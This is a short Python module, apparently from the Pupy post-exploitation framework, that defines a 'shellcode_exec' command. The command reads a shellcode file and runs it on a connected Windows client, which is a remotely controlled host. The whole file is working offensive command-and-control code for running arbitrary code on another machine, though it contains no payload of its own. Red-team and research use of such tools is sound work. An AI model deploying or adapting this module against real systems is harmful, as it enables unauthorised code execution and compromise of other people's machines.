# -*- coding: UTF8 -*-

'''
Module by @byt3bl33d3r
''' 

from pupylib.PupyModule import *

__class_name__="ShellcodeExec"

class ShellcodeExec(PupyModule):
	""" executes the supplied shellcode on a client """

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='shellcode_exec', description=self.__doc__)
		self.arg_parser.add_argument('path', help='Path to the shellcode to execute')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		self.client.load_package("pupwinutils.shellcode")
		with open(args.path ,'r') as sfile:
			shellcode = sfile.read()
			self.client.conn.modules['pupwinutils.shellcode'].exec_shellcode(shellcode)
		self.log('Shellcode executed!')